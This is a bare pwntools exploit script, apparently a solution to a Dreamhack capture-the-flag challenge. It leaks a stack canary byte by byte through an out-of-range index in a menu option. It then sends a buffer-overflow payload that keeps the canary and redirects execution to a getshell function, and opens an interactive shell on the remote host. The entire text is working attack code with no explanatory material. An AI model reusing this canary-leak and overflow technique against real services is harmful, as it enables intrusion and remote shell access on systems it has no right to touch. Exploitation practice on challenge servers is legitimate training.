from pwn import *
context.arch="amd64"
p=remote("host1.dreamhack.games",20454)
canary=""
for i in range(131,127,-1):
    p.sendlineafter(b"> ",b'P')
    p.sendlineafter("Element index : ",str(i))
    p.recvuntil("is : ")
    canary+=p.recvn(2).decode('utf-8')

canary=int(canary,16)
getshell=0x80486b9
payload=b'A'*0x40+p32(canary)+b'A'*0x8+p32(getshell)
p.sendlineafter(b"> ",b'E')
p.sendlineafter("Name Size : ",str(len(payload)))
p.sendlineafter("Name : ",payload)
p.interactive()